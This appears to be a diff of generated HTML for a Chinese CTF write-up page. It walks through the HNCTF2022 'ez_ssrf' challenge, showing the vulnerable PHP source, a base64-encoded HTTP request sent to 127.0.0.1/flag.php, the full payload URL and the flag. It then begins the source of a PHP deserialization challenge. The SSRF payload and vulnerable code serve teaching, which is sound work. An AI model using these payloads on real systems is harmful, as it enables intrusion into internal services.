@@ -3549,29 +3549,29 @@
 <hr />
 <h3 id="_2"><a class="toclink" href="../../hnctf2022-week2-ez-ssrf/#_2">解题过程</a></h3>
 <h4 id="step-1"><a class="toclink" href="../../hnctf2022-week2-ez-ssrf/#step-1">Step 1：先看源码</a></h4>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="cp">&lt;?php</span>
-</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>
-</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a><span class="nv">$data</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'data'</span><span class="p">]);</span>
-</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a><span class="nv">$host</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'host'</span><span class="p">];</span>
-</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a><span class="nv">$port</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'port'</span><span class="p">];</span>
-</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a>
-</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a><span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fsockopen</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nb">intval</span><span class="p">(</span><span class="nv">$port</span><span class="p">),</span> <span class="nv">$error</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span>
-</span><span id="__span-24-10"><a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span>
-</span><span id="__span-24-11"><a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a>    <span class="k">die</span><span class="p">();</span>
-</span><span id="__span-24-12"><a id="__codelineno-24-12" name="__codelineno-24-12" href="#__codelineno-24-12"></a><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-</span><span id="__span-24-13"><a id="__codelineno-24-13" name="__codelineno-24-13" href="#__codelineno-24-13"></a>    <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
-</span><span id="__span-24-14"><a id="__codelineno-24-14" name="__codelineno-24-14" href="#__codelineno-24-14"></a>    <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
-</span><span id="__span-24-15"><a id="__codelineno-24-15" name="__codelineno-24-15" href="#__codelineno-24-15"></a>        <span class="k">echo</span> <span class="nb">fgets</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span>
-</span><span id="__span-24-16"><a id="__codelineno-24-16" name="__codelineno-24-16" href="#__codelineno-24-16"></a>    <span class="p">}</span>
-</span><span id="__span-24-17"><a id="__codelineno-24-17" name="__codelineno-24-17" href="#__codelineno-24-17"></a>    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
-</span><span id="__span-24-18"><a id="__codelineno-24-18" name="__codelineno-24-18" href="#__codelineno-24-18"></a><span class="p">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="cp">&lt;?php</span>
+</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a>
+</span><span id="__span-48-5"><a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a><span class="nv">$data</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'data'</span><span class="p">]);</span>
+</span><span id="__span-48-6"><a id="__codelineno-48-6" name="__codelineno-48-6" href="#__codelineno-48-6"></a><span class="nv">$host</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'host'</span><span class="p">];</span>
+</span><span id="__span-48-7"><a id="__codelineno-48-7" name="__codelineno-48-7" href="#__codelineno-48-7"></a><span class="nv">$port</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'port'</span><span class="p">];</span>
+</span><span id="__span-48-8"><a id="__codelineno-48-8" name="__codelineno-48-8" href="#__codelineno-48-8"></a>
+</span><span id="__span-48-9"><a id="__codelineno-48-9" name="__codelineno-48-9" href="#__codelineno-48-9"></a><span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fsockopen</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nb">intval</span><span class="p">(</span><span class="nv">$port</span><span class="p">),</span> <span class="nv">$error</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span>
+</span><span id="__span-48-10"><a id="__codelineno-48-10" name="__codelineno-48-10" href="#__codelineno-48-10"></a><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-48-11"><a id="__codelineno-48-11" name="__codelineno-48-11" href="#__codelineno-48-11"></a>    <span class="k">die</span><span class="p">();</span>
+</span><span id="__span-48-12"><a id="__codelineno-48-12" name="__codelineno-48-12" href="#__codelineno-48-12"></a><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span id="__span-48-13"><a id="__codelineno-48-13" name="__codelineno-48-13" href="#__codelineno-48-13"></a>    <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+</span><span id="__span-48-14"><a id="__codelineno-48-14" name="__codelineno-48-14" href="#__codelineno-48-14"></a>    <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
+</span><span id="__span-48-15"><a id="__codelineno-48-15" name="__codelineno-48-15" href="#__codelineno-48-15"></a>        <span class="k">echo</span> <span class="nb">fgets</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span>
+</span><span id="__span-48-16"><a id="__codelineno-48-16" name="__codelineno-48-16" href="#__codelineno-48-16"></a>    <span class="p">}</span>
+</span><span id="__span-48-17"><a id="__codelineno-48-17" name="__codelineno-48-17" href="#__codelineno-48-17"></a>    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
+</span><span id="__span-48-18"><a id="__codelineno-48-18" name="__codelineno-48-18" href="#__codelineno-48-18"></a><span class="p">}</span>
 </span></code></pre></div>
 <p><strong>三个参数全部来自 GET，而且都直接进函数：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>host  →  fsockopen 的第一个参数
-</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>port  →  第二个参数（有 intval）
-</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>data  →  base64 解码后直接写进 socket
+<div class="language-text highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>host  →  fsockopen 的第一个参数
+</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>port  →  第二个参数（有 intval）
+</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a>data  →  base64 解码后直接写进 socket
 </span></code></pre></div>
 <p><strong><code>fsockopen</code> 是“建立一条 TCP 连接”，<code>fwrite</code> 是“往这条连接里发原始字节”。</strong></p>
 <p><strong>这等于给了我们一个可以</strong>手写任意 TCP 报文<strong>的口子。</strong></p>
@@ -3583,55 +3583,55 @@
 <h4 id="step-3"><a class="toclink" href="../../hnctf2022-week2-ez-ssrf/#step-3">Step 3：构造发出去的报文</a></h4>
 <p><strong><code>fsockopen('127.0.0.1', 80)</code> 连上的是这台机器自己的 80 端口，也就是 Web 服务器本身。来源地址自然就是 127.0.0.1。</strong></p>
 <p><strong>接下来 <code>fwrite($fp, $data)</code> 会把 <code>data</code> 原样写进这个 socket。</strong>既然对面是 HTTP 服务器，那我们就手写一条 HTTP 请求：**</p>
-<div class="language-http highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="nf">GET</span> <span class="nn">/flag.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
-</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">localhost</span>
-</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="nf">GET</span> <span class="nn">/flag.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">localhost</span>
+</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a><span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
 </span></code></pre></div>
 <p><strong>注意三件事：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>① 每一行结尾必须是 \r\n（CRLF），不是 \n
-</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>② 最后要有一个空行（\r\n\r\n），表示请求头结束
-</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>③ Connection: close 让对端在响应完就关闭连接，
-</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>   这样后面 fgets 才能读到 EOF，不会一直挂着
+<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>① 每一行结尾必须是 \r\n（CRLF），不是 \n
+</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>② 最后要有一个空行（\r\n\r\n），表示请求头结束
+</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a>③ Connection: close 让对端在响应完就关闭连接，
+</span><span id="__span-51-4"><a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a>   这样后面 fgets 才能读到 EOF，不会一直挂着
 </span></code></pre></div>
 <p><strong>编码成 base64：</strong></p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
-</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>
-</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="n">raw</span> <span class="o">=</span> <span class="s2">"GET /flag.php HTTP/1.1</span><span class="se">\r\n</span><span class="s2">Host: localhost</span><span class="se">\r\n</span><span class="s2">Connection: close</span><span class="se">\r\n\r\n</span><span class="s2">"</span>
-</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">raw</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
+</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>
+</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a><span class="n">raw</span> <span class="o">=</span> <span class="s2">"GET /flag.php HTTP/1.1</span><span class="se">\r\n</span><span class="s2">Host: localhost</span><span class="se">\r\n</span><span class="s2">Connection: close</span><span class="se">\r\n\r\n</span><span class="s2">"</span>
+</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">raw</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
 </span></code></pre></div>
 <p><strong>得到：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogbG9jYWxob3N0DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=
+<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogbG9jYWxob3N0DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=
 </span></code></pre></div>
 <h4 id="step-4-base64"><a class="toclink" href="../../hnctf2022-week2-ez-ssrf/#step-4-base64">Step 4：为什么建议用脚本生成 base64</a></h4>
 <p><strong><code>\r\n</code> 这两个字符最容易在“复制粘贴”里丢掉。</strong></p>
 <p><strong>很多在线 base64 工具、聊天框、编辑器，会把 <code>\r\n</code> 悄悄规范成 <code>\n</code>，你看起来“一模一样”，但发出去的报文行尾是 LF，</strong>服务端解析请求行的时候就错了<strong>。</strong></p>
 <p><strong>所以这题的编码一定在脚本里做：</strong>让 <code>\r\n</code> 从代码里生成，不让它经过剪贴板。</p>
 <h4 id="step-5-payload"><a class="toclink" href="../../hnctf2022-week2-ez-ssrf/#step-5-payload">Step 5：打完整 payload</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>index.php?host=127.0.0.1&amp;port=80&amp;data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogbG9jYWxob3N0DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=
+<div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>index.php?host=127.0.0.1&amp;port=80&amp;data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogbG9jYWxob3N0DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=
 </span></code></pre></div>
 <p><strong>服务器做的事：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>fsockopen("127.0.0.1", 80)      建立本机连接，来源 = 127.0.0.1
-</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>fwrite 我们的 HTTP 报文         请求 /flag.php
-</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>while 循环 fgets 读回响应       flag 就在响应体里
-</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a>echo                           输出到页面
+<div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>fsockopen("127.0.0.1", 80)      建立本机连接，来源 = 127.0.0.1
+</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a>fwrite 我们的 HTTP 报文         请求 /flag.php
+</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a>while 循环 fgets 读回响应       flag 就在响应体里
+</span><span id="__span-55-4"><a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a>echo                           输出到页面
 </span></code></pre></div>
 <p><strong>拿到：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>nssctf{095948b9b2be-8444-3750-99ba94d3b4f5}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>nssctf{095948b9b2be-8444-3750-99ba94d3b4f5}
 </span></code></pre></div>
 <hr />
 <h3 id="_3"><a class="toclink" href="../../hnctf2022-week2-ez-ssrf/#_3">顺带解释：为什么这题“回应有点慢”</a></h3>
 <p><strong>源码里这句是写错了的：</strong></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="x">while (!feof($data)) {      // $data 是字符串，不是文件句柄</span>
-</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="x">    echo fgets($fp, 128);</span>
-</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a><span class="x">while (!feof($data)) {      // $data 是字符串，不是文件句柄</span>
+</span><span id="__span-57-2"><a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a><span class="x">    echo fgets($fp, 128);</span>
+</span><span id="__span-57-3"><a id="__codelineno-57-3" name="__codelineno-57-3" href="#__codelineno-57-3"></a><span class="x">}</span>
 </span></code></pre></div>
 <p><strong><code>feof()</code> 的参数应该是文件句柄（这里该是 <code>$fp</code>）。传字符串进去，它只会返回 <code>false</code>（配合 <code>error_reporting(0)</code>，连警告都看不到）。</strong></p>
 <p><strong>于是 <code>!feof($data)</code> 恒为真——这个循环实际上是个</strong>死循环<strong>。</strong></p>
 <p><strong>它能“结束”，靠的是：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>对端响应完 → Connection: close 关闭连接
-</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>→ fgets($fp) 读到 EOF 返回 false
-</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>→ echo false 什么也不输出，但循环还在转
-</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a>→ 直到 PHP 脚本超时（或连接彻底断掉）才停
+<div class="language-text highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>对端响应完 → Connection: close 关闭连接
+</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a>→ fgets($fp) 读到 EOF 返回 false
+</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a>→ echo false 什么也不输出，但循环还在转
+</span><span id="__span-58-4"><a id="__codelineno-58-4" name="__codelineno-58-4" href="#__codelineno-58-4"></a>→ 直到 PHP 脚本超时（或连接彻底断掉）才停
 </span></code></pre></div>
 <p><strong>flag 在第一轮就已经被 <code>echo</code> 出去了，所以你能看到结果；</strong>但请求会一直挂到超时，这就是“慢”的来源。**</p>
 <p><strong>如果按正确写法 <code>feof($fp)</code>，读到 EOF 就该退出循环，响应会立刻返回。</strong></p>
@@ -3681,13 +3681,13 @@
 <hr />
 <details class="note">
 <summary>完整请求</summary>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>GET /index.php?host=127.0.0.1&amp;port=80&amp;data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogbG9jYWxob3N0DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=
-</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>
-</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>data 解码后：
-</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a>GET /flag.php HTTP/1.1\r\n
-</span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a>Host: localhost\r\n
-</span><span id="__span-35-6"><a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a>Connection: close\r\n
-</span><span id="__span-35-7"><a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a>\r\n
+<div class="language-text highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>GET /index.php?host=127.0.0.1&amp;port=80&amp;data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogbG9jYWxob3N0DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=
+</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a>
+</span><span id="__span-59-3"><a id="__codelineno-59-3" name="__codelineno-59-3" href="#__codelineno-59-3"></a>data 解码后：
+</span><span id="__span-59-4"><a id="__codelineno-59-4" name="__codelineno-59-4" href="#__codelineno-59-4"></a>GET /flag.php HTTP/1.1\r\n
+</span><span id="__span-59-5"><a id="__codelineno-59-5" name="__codelineno-59-5" href="#__codelineno-59-5"></a>Host: localhost\r\n
+</span><span id="__span-59-6"><a id="__codelineno-59-6" name="__codelineno-59-6" href="#__codelineno-59-6"></a>Connection: close\r\n
+</span><span id="__span-59-7"><a id="__codelineno-59-7" name="__codelineno-59-7" href="#__codelineno-59-7"></a>\r\n
 </span></code></pre></div>
 </details>
 <details class="note">
@@ -3746,136 +3746,136 @@
 <hr />
 <h3 id="_2"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#_2">解题过程</a></h3>
 <h4 id="step-1-sink"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#step-1-sink">Step 1：读源码，先找 sink</a></h4>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="x">function filter($img){</span>
-</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="x">    $filter_arr = array('php','flag','php5','php4','fl1g');</span>
-</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a><span class="x">    $filter = '/'.implode('|',$filter_arr).'/i';</span>
-</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a><span class="x">    return preg_replace($filter,'',$img);</span>
-</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a><span class="x">}</span>
-</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a>
-</span><span id="__span-38-7"><a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a><span class="x">$_SESSION["user"] = 'guest';</span>
-</span><span id="__span-38-8"><a id="__codelineno-38-8" name="__codelineno-38-8" href="#__codelineno-38-8"></a><span class="x">$_SESSION['function'] = $function;</span>
-</span><span id="__span-38-9"><a id="__codelineno-38-9" name="__codelineno-38-9" href="#__codelineno-38-9"></a><span class="x">extract($_POST);</span>
-</span><span id="__span-38-10"><a id="__codelineno-38-10" name="__codelineno-38-10" href="#__codelineno-38-10"></a>
-</span><span id="__span-38-11"><a id="__codelineno-38-11" name="__codelineno-38-11" href="#__codelineno-38-11"></a><span class="x">if(!$_GET['img_path']){</span>
-</span><span id="__span-38-12"><a id="__codelineno-38-12" name="__codelineno-38-12" href="#__codelineno-38-12"></a><span class="x">    $_SESSION['img'] = base64_encode('guest_img.png');</span>
-</span><span id="__span-38-13"><a id="__codelineno-38-13" name="__codelineno-38-13" href="#__codelineno-38-13"></a><span class="x">}else{</span>
-</span><span id="__span-38-14"><a id="__codelineno-38-14" name="__codelineno-38-14" href="#__codelineno-38-14"></a><span class="x">    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));</span>
-</span><span id="__span-38-15"><a id="__codelineno-38-15" name="__codelineno-38-15" href="#__codelineno-38-15"></a><span class="x">}</span>
-</span><span id="__span-38-16"><a id="__codelineno-38-16" name="__codelineno-38-16" href="#__codelineno-38-16"></a>
-</span><span id="__span-38-17"><a id="__codelineno-38-17" name="__codelineno-38-17" href="#__codelineno-38-17"></a><span class="x">$serialize_info = filter(serialize($_SESSION));</span>
-</span><span id="__span-38-18"><a id="__codelineno-38-18" name="__codelineno-38-18" href="#__codelineno-38-18"></a>
-</span><span id="__span-38-19"><a id="__codelineno-38-19" name="__codelineno-38-19" href="#__codelineno-38-19"></a><span class="x">if($function == 'highlight_file'){</span>
-</span><span id="__span-38-20"><a id="__codelineno-38-20" name="__codelineno-38-20" href="#__codelineno-38-20"></a><span class="x">    highlight_file('index.php');</span>
-</span><span id="__span-38-21"><a id="__codelineno-38-21" name="__codelineno-38-21" href="#__codelineno-38-21"></a><span class="x">}else if($function == 'phpinfo'){</span>
-</span><span id="__span-38-22"><a id="__codelineno-38-22" name="__codelineno-38-22" href="#__codelineno-38-22"></a><span class="x">    eval('phpinfo();');</span>
-</span><span id="__span-38-23"><a id="__codelineno-38-23" name="__codelineno-38-23" href="#__codelineno-38-23"></a><span class="x">}else if($function == 'show_image'){</span>
-</span><span id="__span-38-24"><a id="__codelineno-38-24" name="__codelineno-38-24" href="#__codelineno-38-24"></a><span class="x">    $userinfo = unserialize($serialize_info);</span>
-</span><span id="__span-38-25"><a id="__codelineno-38-25" name="__codelineno-38-25" href="#__codelineno-38-25"></a><span class="x">    echo file_get_contents(base64_decode($userinfo['img']));</span>
-</span><span id="__span-38-26"><a id="__codelineno-38-26" name="__codelineno-38-26" href="#__codelineno-38-26"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a><span class="x">function filter($img){</span>
+</span><span id="__span-57-2"><a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a><span class="x">    $filter_arr = array('php','flag','php5','php4','fl1g');</span>
+</span><span id="__span-57-3"><a id="__codelineno-57-3" name="__codelineno-57-3" href="#__codelineno-57-3"></a><span class="x">    $filter = '/'.implode('|',$filter_arr).'/i';</span>
+</span><span id="__span-57-4"><a id="__codelineno-57-4" name="__codelineno-57-4" href="#__codelineno-57-4"></a><span class="x">    return preg_replace($filter,'',$img);</span>
+</span><span id="__span-57-5"><a id="__codelineno-57-5" name="__codelineno-57-5" href="#__codelineno-57-5"></a><span class="x">}</span>
+</span><span id="__span-57-6"><a id="__codelineno-57-6" name="__codelineno-57-6" href="#__codelineno-57-6"></a>
+</span><span id="__span-57-7"><a id="__codelineno-57-7" name="__codelineno-57-7" href="#__codelineno-57-7"></a><span class="x">$_SESSION["user"] = 'guest';</span>
+</span><span id="__span-57-8"><a id="__codelineno-57-8" name="__codelineno-57-8" href="#__codelineno-57-8"></a><span class="x">$_SESSION['function'] = $function;</span>
